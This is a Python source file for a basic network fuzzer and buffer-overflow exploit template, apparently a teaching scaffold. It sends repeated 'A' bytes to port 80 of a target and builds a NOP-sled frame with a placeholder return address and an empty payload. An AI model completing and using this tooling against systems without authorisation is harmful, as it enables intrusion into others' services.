"""
CNO Python Basic Fuzzer and Exploiter Framework
Created by: Francis Murray
Date: 19 OCT 2018
Rev: 28 AUG 2019
"""

import socket

import click

CHANGE_ME = 1024
SIZE_OF_BUFFER = CHANGE_ME

@click.group()
@click.argument("ip_address")
@click.pass_context
def cli(ctx, ip_address):
    '''
        This is the main handler for the fuzzer / exploiter
        @in ip_address: the ip of the tgt machine
    '''
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if s is not None:
            s.connect((ip_address, 80))
        else:
            click.echo("The socket was not made")
            exit(-1)
        if s is not None:
            ctx.obj = {'socket': s}
        else:
            click.echo("The socket is of none type.")
            exit(-1)
        pass
    except ConnectionRefusedError:
        click.echo("Unable to connect to {}".format(ip_address))

@click.command()
@click.pass_context
def fuzzer(ctx):
    '''
        This is the fuzzer it just sends \x41s or other chars, you can add chars to the fuzz string
    '''
        
    if ctx is not None:
        if ctx.obj is not None:
            
            fuzz = b"\x41" * CHANGE_ME

            print("Sending {}".format(repr(fuzz)))

            ctx.obj['socket'].send(fuzz)
        else:
            print("ctx.obj is none")
            exit(-1)
    else:
        print("Pass context failed")
        exit(-1)


@click.command()
@click.pass_context
def exploit(ctx):
    if ctx is not None:
        '''
            This is the exploiter it sends a nop sled padded payload and mem address
        '''
        if ctx.obj is not None:

            nop_sled = b"\x90" * CHANGE_ME
            payload = b""

            mem_address = b"\x00\x00\x00\x00" # CHANGE ME this isn't right lol

            mini_nop = b"\x90"*10 # padding

            nop_sled_end = b"\x90" * (SIZE_OF_BUFFER - len(nop_sled) -len(mini_nop) - len(payload) - len(mem_address))
            fuzz = nop_sled + mem_address + mini_nop + payload + nop_sled_end

            print("Sending {}".format(repr(fuzz)))
            ctx.obj['socket'].send(fuzz)

        else:
            print("ctx.obj is none")
            exit(-1)
    else:
        print("Pass context failed")
        exit(-1)


cli.add_command(fuzzer)
cli.add_command(exploit)

cli()
